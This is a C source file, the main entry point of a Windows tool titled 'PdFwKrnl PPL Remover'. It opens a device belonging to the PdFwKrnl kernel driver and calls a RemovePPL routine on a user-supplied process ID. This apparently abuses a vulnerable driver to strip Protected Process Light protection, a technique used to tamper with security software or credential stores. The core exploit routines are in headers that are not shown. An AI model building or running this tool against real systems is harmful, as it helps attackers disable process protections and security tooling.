#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "PdFwKrnl.h"
#include "RemovePPL.h"

// -----------------------
// Helpers
// -----------------------

static VOID PrintUsage(
    _In_ PWSTR pwszExe
)
{
    wprintf(L"Usage: %ls <PID>\n", pwszExe);
    wprintf(L"  PID  Target process ID (decimal)\n\n");
    wprintf(L"Example: %ls 1234\n", pwszExe);
}

// -----------------------
// Entry Point
// -----------------------

INT wmain(
    _In_ INT    nArgc,
    _In_ PWSTR* ppwszArgv
)
{
    DWORD  dwPid = 0;
    HANDLE hDev  = INVALID_HANDLE_VALUE;
    BOOL   bOk   = FALSE;

    printf("=== PdFwKrnl PPL Remover ===\n\n");

    if (nArgc != 2)
    {
        PrintUsage(ppwszArgv[0]);
        return 1;
    }

    dwPid = (DWORD)wcstoul(ppwszArgv[1], NULL, 10);
    if (dwPid == 0)
    {
        wprintf(L"[-] Invalid PID: %ls\n", ppwszArgv[1]);
        PrintUsage(ppwszArgv[0]);
        return 1;
    }

    printf("[*] Target PID: %lu\n\n", dwPid);

    hDev = OpenPdFwDevice();
    if (hDev == INVALID_HANDLE_VALUE)
        return 1;

    printf("[+] PdFwKrnl device opened\n\n");

    bOk = RemovePPL(hDev, dwPid);

    CloseHandle(hDev);

    if (bOk)
    {
        printf("\n[+] Done\n");
        return 0;
    }
    else
    {
        printf("\n[-] Failed\n");
        return 1;
    }
}
